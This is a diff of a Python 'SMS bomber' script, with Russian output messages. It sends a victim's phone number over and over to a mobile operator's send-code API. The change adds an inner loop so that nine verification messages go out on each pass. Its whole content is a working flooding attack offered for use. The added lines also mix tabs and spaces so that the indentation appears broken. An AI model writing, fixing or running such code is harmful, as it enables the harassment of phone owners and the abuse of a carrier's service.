@@ -1694,11 +1694,15 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
+	   i=0
+	  
+	
+           while i < 9:  
+		requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
                           params={"msisdn": _phone})
-            R = R + 1
-            print('[+] MTS отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
+            	R = R + 1
+            	print('[+] MTS отправлено! || Кол-во - ' + str(R))
+            	time.sleep(0.1)
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
